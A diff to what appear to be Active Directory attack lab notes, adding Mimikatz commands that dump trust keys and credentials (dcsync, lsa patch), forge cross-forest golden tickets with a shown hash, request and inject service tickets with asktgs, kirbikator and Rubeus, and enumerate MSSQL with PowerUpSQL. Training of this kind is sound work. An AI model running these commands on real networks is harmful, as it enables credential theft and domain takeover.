@@ -278,7 +278,7 @@ You could load your own dll, which can create reverse shell, but DNS is synchorn
 ## Trust
 ### Child to Parent
 ### 1. Using Trust ticket
-1. find the trust key
+1. find the trust key **[IN]**
 ```
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
@@ -300,6 +300,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 ```powershell
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 ```
+> Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
 
 4. Use the TGS to access the targeted service (may need to use it twice)
 ```powershell
@@ -332,6 +333,53 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarco
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
 ``` 
+
+### Across Forest
+1. find the trust key **[IN]**
+```powershell
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName mcorp-dc
+
+# DCSync (mcrop$ is the parant account)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\ecorp$"'
+
+#dump all cred
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+2. Forge TGT
+```powershell
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'
+```
+3. Get TGS
+```powershell
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+```
+> Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
+
+4. Use TGS
+```powershell
+ .\kirbikator.exe lsa .\CIFS.eurocorpdc.eurocorp.local.kirbi
+```
+Or you could skip step 3-4 using Rubeus
+```powershell
+.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+
+## MSSQL
+1. Enumurate MSSQL
+```powershell
+Import-Module .\PowerupSQL.psd1
+#Discovery (SPN Scanning)
+Get-SQLInstanceDomain
+
+#Check Accessibility
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose 
+
+#Gather Information
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+
 
 
 # Jenkin --> move to CVE catagory
